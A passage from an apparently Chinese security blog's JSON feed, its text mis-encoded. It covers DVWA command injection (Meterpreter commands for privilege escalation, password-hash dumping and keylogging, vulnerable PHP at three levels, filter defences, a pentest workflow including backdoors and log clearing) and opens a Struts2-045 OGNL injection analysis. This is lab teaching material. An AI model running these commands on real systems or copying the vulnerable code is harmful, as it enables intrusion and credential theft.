</span><span class=\"language-bash\">è·å–ç³»ç»Ÿä¿¡æ¯</span><br>sysinfo<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">è·å–ç”¨æˆ·æƒé™</span><br>getuid<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">ææƒåˆ°SYSTEM</span><br>getsystem<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">è·å–å¯†ç å“ˆå¸Œ</span><br>hashdump<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">æˆªå±</span><br>screenshot<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">é”®ç›˜è®°å½•</span><br>keyscan_start<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ›¡ï¸-é˜²æŠ¤æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²æŠ¤æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²æŠ¤æªæ–½\"></a>ğŸ›¡ï¸ é˜²æŠ¤æªæ–½</h2><h3 id=\"è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\"><a href=\"#è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\" class=\"headerlink\" title=\"è¾“å…¥éªŒè¯å’Œè¿‡æ»¤\"></a>è¾“å…¥éªŒè¯å’Œè¿‡æ»¤</h3><h4 id=\"1-ç™½åå•éªŒè¯\"><a href=\"#1-ç™½åå•éªŒè¯\" class=\"headerlink\" title=\"1. ç™½åå•éªŒè¯\"></a>1. ç™½åå•éªŒè¯</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">validateIP</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// ä½¿ç”¨ç™½åå•éªŒè¯IPåœ°å€æ ¼å¼</span><br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$ip</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">false</span>;<br>&#125;<br><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$validIP</span> = <span class=\"hljs-title function_ invoke__\">validateIP</span>(<span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$validIP</span>) &#123;<br>    <span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-title function_ invoke__\">escapeshellarg</span>(<span class=\"hljs-variable\">$validIP</span>));<br>&#125; <span class=\"hljs-keyword\">else</span> &#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;Invalid IP address&quot;</span>;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\"><a href=\"#2-ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\" class=\"headerlink\" title=\"2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤\"></a>2. ç‰¹æ®Šå­—ç¬¦è¿‡æ»¤</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">filterDangerousChars</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$input</span></span>) </span>&#123;<br>    <span class=\"hljs-comment\">// è¿‡æ»¤å±é™©å­—ç¬¦</span><br>    <span class=\"hljs-variable\">$dangerous</span> = <span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;;&#x27;</span>, <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;|&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;$&#x27;</span>, <span class=\"hljs-string\">&#x27;(&#x27;</span>, <span class=\"hljs-string\">&#x27;)&#x27;</span>, <span class=\"hljs-string\">&#x27;&#123;&#x27;</span>, <span class=\"hljs-string\">&#x27;&#125;&#x27;</span>, <span class=\"hljs-string\">&#x27;[&#x27;</span>, <span class=\"hljs-string\">&#x27;]&#x27;</span>, <span class=\"hljs-string\">&#x27;&lt;&#x27;</span>, <span class=\"hljs-string\">&#x27;&gt;&#x27;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-variable\">$dangerous</span>, <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$input</span>);<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ä½¿ç”¨å®‰å…¨çš„API\"><a href=\"#ä½¿ç”¨å®‰å…¨çš„API\" class=\"headerlink\" title=\"ä½¿ç”¨å®‰å…¨çš„API\"></a>ä½¿ç”¨å®‰å…¨çš„API</h3><h4 id=\"é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\"><a href=\"#é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\" class=\"headerlink\" title=\"é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤\"></a>é¿å…ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// ä¸å®‰å…¨çš„æ–¹å¼</span><br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><br><span class=\"hljs-comment\">// å®‰å…¨çš„æ–¹å¼ï¼šä½¿ç”¨ä¸“é—¨çš„å‡½æ•°</span><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">securePing</span>(<span class=\"hljs-params\"><span class=\"hljs-variable\">$ip</span></span>) </span>&#123;<br>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">filter_var</span>(<span class=\"hljs-variable\">$ip</span>, FILTER_VALIDATE_IP)) &#123;<br>        <span class=\"hljs-comment\">// ä½¿ç”¨socketæˆ–å…¶ä»–å®‰å…¨æ–¹å¼å®ç°pingåŠŸèƒ½</span><br>        <span class=\"hljs-comment\">// è€Œä¸æ˜¯ç›´æ¥è°ƒç”¨ç³»ç»Ÿå‘½ä»¤</span><br>    &#125;<br>&#125;<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æƒé™æ§åˆ¶\"><a href=\"#æƒé™æ§åˆ¶\" class=\"headerlink\" title=\"æƒé™æ§åˆ¶\"></a>æƒé™æ§åˆ¶</h3><ol>\n<li><strong>æœ€å°æƒé™åŸåˆ™</strong>ï¼šWebåº”ç”¨ç¨‹åºåº”è¯¥ä»¥æœ€å°æƒé™ç”¨æˆ·è¿è¡Œ</li>\n<li><strong>ç¦ç”¨å±é™©å‡½æ•°</strong>ï¼šåœ¨php.iniä¸­ç¦ç”¨<code>exec</code>, <code>shell_exec</code>, <code>system</code>ç­‰å‡½æ•°</li>\n<li><strong>æ²™ç®±ç¯å¢ƒ</strong>ï¼šå°†Webåº”ç”¨ç¨‹åºè¿è¡Œåœ¨å—é™çš„ç¯å¢ƒä¸­</li>\n</ol>\n<h3 id=\"ä»£ç å®¡è®¡\"><a href=\"#ä»£ç å®¡è®¡\" class=\"headerlink\" title=\"ä»£ç å®¡è®¡\"></a>ä»£ç å®¡è®¡</h3><p>å®šæœŸè¿›è¡Œä»£ç å®‰å…¨å®¡è®¡ï¼Œé‡ç‚¹å…³æ³¨ï¼š</p>\n<ul>\n<li>ç”¨æˆ·è¾“å…¥å¤„ç†</li>\n<li>ç³»ç»Ÿå‘½ä»¤è°ƒç”¨</li>\n<li>æ–‡ä»¶æ“ä½œ</li>\n<li>æ•°æ®åº“æŸ¥è¯¢</li>\n</ul>\n<hr>\n<h2 id=\"ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ\"><a href=\"#ğŸ“Š-å®‰å…¨ç­‰çº§åˆ†æ\" class=\"headerlink\" title=\"ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ\"></a>ğŸ“Š å®‰å…¨ç­‰çº§åˆ†æ</h2><h3 id=\"DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\"><a href=\"#DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\" class=\"headerlink\" title=\"DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶\"></a>DVWAå„å®‰å…¨ç­‰çº§çš„é˜²æŠ¤æœºåˆ¶</h3><h4 id=\"Lowçº§åˆ«\"><a href=\"#Lowçº§åˆ«\" class=\"headerlink\" title=\"Lowçº§åˆ«\"></a>Lowçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// å®Œå…¨æ²¡æœ‰è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Mediumçº§åˆ«\"><a href=\"#Mediumçº§åˆ«\" class=\"headerlink\" title=\"Mediumçº§åˆ«\"></a>Mediumçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// ç®€å•çš„é»‘åå•è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-keyword\">array</span>(<span class=\"hljs-string\">&#x27;&amp;&amp;&#x27;</span>, <span class=\"hljs-string\">&#x27;;&#x27;</span>), <span class=\"hljs-string\">&#x27;&#x27;</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h4 id=\"Highçº§åˆ«\"><a href=\"#Highçº§åˆ«\" class=\"headerlink\" title=\"Highçº§åˆ«\"></a>Highçº§åˆ«</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-comment\">// æ›´ä¸¥æ ¼çš„è¿‡æ»¤</span><br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">trim</span>(<span class=\"hljs-variable\">$_REQUEST</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>]);<br><span class=\"hljs-variable\">$substitutions</span> = <span class=\"hljs-keyword\">array</span>(<br>    <span class=\"hljs-string\">&#x27;&amp;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;;&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;| &#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;-&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;$&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;(&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;)&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;`&#x27;</span>  =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>    <span class=\"hljs-string\">&#x27;||&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;&#x27;</span>,<br>);<br><span class=\"hljs-variable\">$target</span> = <span class=\"hljs-title function_ invoke__\">str_replace</span>(<span class=\"hljs-title function_ invoke__\">array_keys</span>(<span class=\"hljs-variable\">$substitutions</span>), <span class=\"hljs-variable\">$substitutions</span>, <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-variable\">$cmd</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&#x27;ping -c 4 &#x27;</span> . <span class=\"hljs-variable\">$target</span>);<br><span class=\"hljs-meta\">?&gt;</span><br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ“-å­¦ä¹ è¦ç‚¹\"><a href=\"#ğŸ“-å­¦ä¹ è¦ç‚¹\" class=\"headerlink\" title=\"ğŸ“ å­¦ä¹ è¦ç‚¹\"></a>ğŸ“ å­¦ä¹ è¦ç‚¹</h2><h3 id=\"å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\"><a href=\"#å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\" class=\"headerlink\" title=\"å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“\"></a>å…³é”®çŸ¥è¯†ç‚¹æ€»ç»“</h3><ol>\n<li><strong>æ¼æ´æˆå› </strong>ï¼šç¼ºä¹è¾“å…¥éªŒè¯å’Œè¾“å‡ºè¿‡æ»¤</li>\n<li><strong>åˆ©ç”¨æ–¹æ³•</strong>ï¼šå‘½ä»¤è¿æ¥ç¬¦ã€ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</li>\n<li><strong>å±å®³ç¨‹åº¦</strong>ï¼šæœåŠ¡å™¨å®Œå…¨æ§åˆ¶ã€æ•°æ®æ³„éœ²</li>\n<li><strong>é˜²æŠ¤ç­–ç•¥</strong>ï¼šè¾“å…¥éªŒè¯ã€æƒé™æ§åˆ¶ã€å®‰å…¨ç¼–ç </li>\n</ol>\n<h3 id=\"æ¸—é€æµ‹è¯•æµç¨‹\"><a href=\"#æ¸—é€æµ‹è¯•æµç¨‹\" class=\"headerlink\" title=\"æ¸—é€æµ‹è¯•æµç¨‹\"></a>æ¸—é€æµ‹è¯•æµç¨‹</h3><ol>\n<li><strong>ä¿¡æ¯æ”¶é›†</strong>ï¼šç¡®å®šç›®æ ‡å’Œæ”»å‡»é¢</li>\n<li><strong>æ¼æ´å‘ç°</strong>ï¼šå¯»æ‰¾å‘½ä»¤æ‰§è¡Œç‚¹</li>\n<li><strong>æ¼æ´éªŒè¯</strong>ï¼šç¡®è®¤æ¼æ´å­˜åœ¨</li>\n<li><strong>æ¼æ´åˆ©ç”¨</strong>ï¼šè·å–ç³»ç»Ÿæƒé™</li>\n<li><strong>æƒé™ç»´æŒ</strong>ï¼šä¸Šä¼ åé—¨ã€å»ºç«‹æŒä¹…è¿æ¥</li>\n<li><strong>ç—•è¿¹æ¸…ç†</strong>ï¼šåˆ é™¤æ—¥å¿—ã€æ¢å¤ç³»ç»ŸçŠ¶æ€</li>\n</ol>\n<hr>\n<h2 id=\"âš ï¸-å…è´£å£°æ˜\"><a href=\"#âš ï¸-å…è´£å£°æ˜\" class=\"headerlink\" title=\"âš ï¸ å…è´£å£°æ˜\"></a>âš ï¸ å…è´£å£°æ˜</h2><p>æœ¬æ–‡å†…å®¹ä»…ä¾›ç½‘ç»œå®‰å…¨å­¦ä¹ å’Œç ”ç©¶ä½¿ç”¨ï¼Œè¯·å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚ä»»ä½•ä¸ªäººæˆ–ç»„ç»‡ä½¿ç”¨æœ¬æ–‡ä¿¡æ¯è¿›è¡Œçš„è¿æ³•æ´»åŠ¨ï¼Œå‡ä¸ä½œè€…æ— å…³ã€‚è¯»è€…åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œåœ¨åˆæ³•æˆæƒçš„ç¯å¢ƒä¸‹è¿›è¡Œå®‰å…¨æµ‹è¯•ã€‚</p>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "Webå®‰å…¨",
                "å‘½ä»¤æ‰§è¡Œ",
                "æ¼æ´åˆ©ç”¨"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "url": "https://bae-ace.github.io/2025/07/24/Struts2-045-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/",
            "title": "Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ",
            "date_published": "2025-07-24T00:10:34.000Z",
            "content_html": "<h1 id=\"Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\"><a href=\"#Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\" class=\"headerlink\" title=\"Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ\"></a>Struts2-045è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ä¸åŸç†åˆ†æ</h1><h2 id=\"æ¼æ´æ¦‚è¿°\"><a href=\"#æ¼æ´æ¦‚è¿°\" class=\"headerlink\" title=\"æ¼æ´æ¦‚è¿°\"></a>æ¼æ´æ¦‚è¿°</h2><p>Struts2-045ï¼ˆCVE-2017-5638ï¼‰æ˜¯Apache Struts2æ¡†æ¶ä¸­çš„ä¸€ä¸ªä¸¥é‡è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œè¯¥æ¼æ´å› å…¶å½±å“èŒƒå›´å¹¿ã€åˆ©ç”¨ç®€å•è€Œå¤‡å—å…³æ³¨ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„Content-Typeè¯·æ±‚å¤´ï¼Œåœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p>\n<h2 id=\"æ¼æ´åŸºæœ¬ä¿¡æ¯\"><a href=\"#æ¼æ´åŸºæœ¬ä¿¡æ¯\" class=\"headerlink\" title=\"æ¼æ´åŸºæœ¬ä¿¡æ¯\"></a>æ¼æ´åŸºæœ¬ä¿¡æ¯</h2><h3 id=\"å½±å“ç‰ˆæœ¬\"><a href=\"#å½±å“ç‰ˆæœ¬\" class=\"headerlink\" title=\"å½±å“ç‰ˆæœ¬\"></a>å½±å“ç‰ˆæœ¬</h3><ul>\n<li><strong>Apache Struts 2.3.5 - 2.3.31</strong>ï¼ˆåŒ…å«2.3.31ç‰ˆæœ¬ï¼‰</li>\n<li><strong>Apache Struts 2.5.0 - 2.5.10</strong>ï¼ˆåŒ…å«2.5.10ç‰ˆæœ¬ï¼‰</li>\n</ul>\n<h3 id=\"æ¼æ´ç­‰çº§\"><a href=\"#æ¼æ´ç­‰çº§\" class=\"headerlink\" title=\"æ¼æ´ç­‰çº§\"></a>æ¼æ´ç­‰çº§</h3><ul>\n<li><strong>CVSSè¯„åˆ†</strong>: 10.0ï¼ˆä¸¥é‡ï¼‰</li>\n<li><strong>æ¼æ´ç±»å‹</strong>: è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</li>\n<li><strong>æ”»å‡»å¤æ‚åº¦</strong>: ä½</li>\n</ul>\n<h3 id=\"æ ¸å¿ƒåŸç†\"><a href=\"#æ ¸å¿ƒåŸç†\" class=\"headerlink\" title=\"æ ¸å¿ƒåŸç†\"></a>æ ¸å¿ƒåŸç†</h3><p>Struts2æ¡†æ¶åœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ è¯·æ±‚æ—¶ï¼Œä¼šè§£æContent-Typeè¯·æ±‚å¤´ã€‚å½“Content-Typeæ ¼å¼ä¸æ­£ç¡®æ—¶ï¼Œæ¡†æ¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œ<strong>å¼‚å¸¸å¤„ç†è¿‡ç¨‹ä¸­ä¼šå¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æ</strong>ï¼Œè¿™å°±ç»™äº†æ”»å‡»è€…å¯ä¹˜ä¹‹æœºã€‚</p>\n<h2 id=\"æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\"><a href=\"#æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\" class=\"headerlink\" title=\"æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ\"></a>æŠ€æœ¯åŸç†æ·±åº¦åˆ†æ</h2><h3 id=\"OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\"><a href=\"#OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\" class=\"headerlink\" title=\"OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶\"></a>OGNLè¡¨è¾¾å¼æ³¨å…¥æœºåˆ¶</h3><p><strong>OGNLï¼ˆObject-Graph Navigation Languageï¼‰</strong> æ˜¯Struts2æ¡†æ¶ä½¿ç”¨çš„è¡¨è¾¾å¼è¯­è¨€ï¼Œç”¨äºåœ¨Javaå¯¹è±¡ä¹‹é—´è¿›è¡Œå¯¼èˆªå’Œæ“ä½œã€‚</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-comment\">// OGNLè¡¨è¾¾å¼ç¤ºä¾‹</span><br><span class=\"hljs-selector-id\">#context</span><span class=\"hljs-selector-attr\">[<span class=\"hljs-string\">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span> = false<br>@java<span class=\"hljs-selector-class\">.lang</span>.Runtime@<span class=\"hljs-built_in\">getRuntime</span>()<span class=\"hljs-selector-class\">.exec</span>(<span class=\"hljs-string\">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è§¦å‘æµç¨‹\"><a href=\"#æ¼æ´è§¦å‘æµç¨‹\" class=\"headerlink\" title=\"æ¼æ´è§¦å‘æµç¨‹\"></a>æ¼æ´è§¦å‘æµç¨‹</h3><ol>\n<li><strong>è¯·æ±‚æ¥æ”¶</strong>: æœåŠ¡å™¨æ¥æ”¶åŒ…å«æ¶æ„Content-Typeçš„HTTPè¯·æ±‚</li>\n<li><strong>ç±»å‹è§£æ</strong>: Struts2å°è¯•è§£æContent-Typeå¤´éƒ¨ä¿¡æ¯</li>\n<li><strong>å¼‚å¸¸è§¦å‘</strong>: æ¶æ„æ„é€ çš„Content-Typeå¯¼è‡´è§£æå¼‚å¸¸</li>\n<li><strong>é”™è¯¯å¤„ç†</strong>: å¼‚å¸¸å¤„ç†å™¨å¯¹é”™è¯¯ä¿¡æ¯è¿›è¡ŒOGNLè§£æ</li>\n<li><strong>ä»£ç æ‰§è¡Œ</strong>: æ¶æ„OGNLè¡¨è¾¾å¼è¢«æ‰§è¡Œï¼Œå®ç°RCE</li>\n</ol>\n<h3 id=\"å…³é”®æºç åˆ†æ\"><a href=\"#å…³é”®æºç åˆ†æ\" class=\"headerlink\" title=\"å…³é”®æºç åˆ†æ\"></a>å…³é”®æºç åˆ†æ</h3><p>æ¼æ´ä½äº<code>org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest</code>ç±»ä¸­ï¼š</p>\n<figure class=\"highlight typescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs typescript\"><span class=\"hljs-comment\">// ç®€åŒ–çš„æ¼æ´ä»£ç é€»è¾‘</span><br><span class=\"hljs-keyword\">private</span> <span class=\"hljs-built_in\">void</span> <span class=\"hljs-title function_\">buildErrorMessage</span>(<span class=\"hljs-params\"><span class=\"hljs-title class_\">Throwable</span> e, <span class=\"hljs-title class_\">Object</span>[] args</span>) &#123;<br>    <span class=\"hljs-title class_\">String</span> errorMessage = localizedTextProvider.<span class=\"hljs-title function_\">findDefaultText</span>(e.<span class=\"hljs-title function_\">getMessage</span>(), locale, args);<br>    <span class=\"hljs-comment\">// è¿™é‡Œä¼šå¯¹errorMessageè¿›è¡ŒOGNLè¡¨è¾¾å¼è§£æï¼Œå¯¼è‡´RCE</span><br>    <span class=\"hljs-keyword\">if</span> (errorMessage != <span class=\"hljs-literal\">null</span>) &#123;<br>        errorMessage = <span class=\"hljs-title class_\">TextParseUtil</span>.<span class=\"hljs-title function_\">translateVariables</span>(errorMessage, stack);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"å®éªŒç¯å¢ƒæ­å»º\"><a href=\"#å®éªŒç¯å¢ƒæ­å»º\" class=\"headerlink\" title=\"å®éªŒç¯å¢ƒæ­å»º\"></a>å®éªŒç¯å¢ƒæ­å»º</h2><h3 id=\"ç³»ç»Ÿæ¶æ„\"><a href=\"#ç³»ç»Ÿæ¶æ„\" class=\"headerlink\" title=\"ç³»ç»Ÿæ¶æ„\"></a>ç³»ç»Ÿæ¶æ„</h3><figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nix\">â”Œâ”€ æ”»å‡»æœºï¼ˆHostï¼‰<br>â”‚  â””â”€ 